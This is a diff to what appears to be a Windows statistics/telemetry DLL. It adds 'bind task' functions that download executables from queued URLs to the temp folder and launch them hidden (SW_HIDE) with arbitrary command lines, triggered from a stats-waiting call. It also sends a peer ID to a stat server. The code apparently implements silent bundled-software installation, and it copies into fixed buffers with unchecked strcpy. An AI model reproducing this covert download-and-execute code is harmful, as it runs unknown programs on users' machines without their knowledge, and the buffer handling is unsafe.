@@ -12,6 +12,8 @@
 #include <shellapi.h>
 #include <tlhelp32.h>
 #include <atlstr.h>
+#include <vector>
+
 HINSTANCE gInstance = NULL;
 
 BOOL APIENTRY DllMain( HMODULE hModule,
@@ -135,9 +137,46 @@ extern "C" __declspec(dllexport) void SendAnyHttpStat(CHAR *ec,CHAR *ea, CHAR *e
 	//SendHttpStatThread((LPVOID)szURL);
 }
 
+struct sBindInfo
+{
+	std::string strBindUrl;
+	std::string strCmdLine;
+};
+std::vector<sBindInfo> vBindData;
+extern "C" __declspec(dllexport) void AddBindTask(const char* szUrl, const char* szCmdLine)
+{
+	sBindInfo sinfo;
+	sinfo.strBindUrl = szUrl;
+	sinfo.strCmdLine = szCmdLine;
+	vBindData.push_back(sinfo);
+}
+
+extern DWORD WINAPI DownLoadWork(LPVOID pParameter);
+void ExecBindTask()
+{
+	DWORD dwThreadId = 0;
+	HANDLE hThread;
+	std::vector<sBindInfo>::iterator it = vBindData.begin();
+	for(; it != vBindData.end(); ++it){
+		//dwThreadId = 0
+		char* pNewData = new char[512];
+		memset(pNewData, 0, 512);
+		strcpy(pNewData, it->strBindUrl.c_str());
+		strcpy(pNewData+it->strBindUrl.length()+1, it->strCmdLine.c_str());
+		hThread = CreateThread(NULL, 0, DownLoadWork, (LPVOID)pNewData,0, &dwThreadId);
+		if (NULL != hThread)
+		{
+			DWORD dwRet = WaitForSingleObject(hThread, INFINITE);
+			DWORD dwLastError = ::GetLastError();
+			TSDEBUG4CXX("wait for ExecBindTask  finish, error = " << dwLastError <<", url = "<< it->strBindUrl.c_str()<<", strCmdLine = "<< it->strCmdLine.c_str());
+			CloseHandle(hThread);
+		}
+	}
+}
 
 extern "C" __declspec(dllexport) void WaitForStat()
 {
+	ExecBindTask();
 	DWORD ret = WaitForSingleObject(s_ListenHandle, 20000);
 	if (ret == WAIT_TIMEOUT){
 	}
@@ -288,8 +327,10 @@ extern "C" __declspec(dllexport) bool GetProfileFolder(char* szMainDir)	// ʧ�ܷ
 
 DWORD WINAPI DownLoadWork(LPVOID pParameter)
 {
-	CHAR szUrl[MAX_PATH] = {0};
+	CHAR szUrl[MAX_PATH] = {0}, szCmdLine[MAX_PATH] = {0};
 	strcpy(szUrl,(LPCSTR)pParameter);
+	strcpy(szCmdLine,(LPCSTR)pParameter+strlen(szUrl)+1);
+	TSDEBUG4CXX("[DownLoadWork] szUrl = "<<szUrl<<", szCmdLine = "<<szCmdLine);
 	CHAR szBuffer[MAX_PATH] = {0};
 	DWORD len = GetTempPathA(MAX_PATH, szBuffer);
 	if(len == 0)
@@ -316,8 +357,14 @@ DWORD WINAPI DownLoadWork(LPVOID pParameter)
 	::CoUninitialize();
 	if (strstr(szBuffer, ".exe") != NULL && SUCCEEDED(hr) && ::PathFileExistsA(szBuffer))
 	{
-		::ShellExecuteA(NULL,"open",szBuffer,NULL,NULL,SW_HIDE);
+		TSDEBUG4CXX("[DownLoadWork] begin ShellExecuteA szUrl = "<<szUrl<<", szCmdLine = "<<szCmdLine);
+		::ShellExecuteA(NULL,"open",szBuffer,szCmdLine,NULL,SW_HIDE);
 	}
+	else
+	{
+		TSDEBUG4CXX("[DownLoadWork]  ShellExecuteA error, szUrl = "<<szUrl<<", szCmdLine = "<<szCmdLine<<", hr = "<<hr);
+	}
+	delete [] pParameter;
 	return SUCCEEDED(hr)?ERROR_SUCCESS:0xFF;
 }
 
@@ -372,16 +419,6 @@ extern "C" __declspec(dllexport) void Send2LvdunAnyHttpStat(CHAR *op, CHAR *cid,
 	char szPid[256] = {0};
 	extern void GetPeerID(CHAR * pszPeerID);
 	GetPeerID(szPid);
-	/*szPid[12] = '\0';
-	char szMac[128] = {0};
-	for(int i = 0; i < strlen(szPid); ++i)
-	{
-		if(i != 0 && i%2 == 0)
-		{
-			strcat(szMac, "-");
-		}
-		szMac[strlen(szMac)] = szPid[i];
-	}*/
 	std::string str = "http://stat.ggxpc.com:8082/c?appid=1001&peerid=";
 	str += szPid;
 	str += "&proid=13&op=";
@@ -393,7 +430,6 @@ extern "C" __declspec(dllexport) void Send2LvdunAnyHttpStat(CHAR *op, CHAR *cid,
 	CHAR* szURL = new CHAR[MAX_PATH];
 	memset(szURL, 0, MAX_PATH);
 	sprintf(szURL, "%s", str.c_str());
-	//SendHttpStatThread((LPVOID)szURL);
 	ResetUserHandle();
 	DWORD dwThreadId = 0;
 	HANDLE hThread = CreateThread(NULL, 0, SendHttpStatThread, (LPVOID)szURL,0, &dwThreadId);
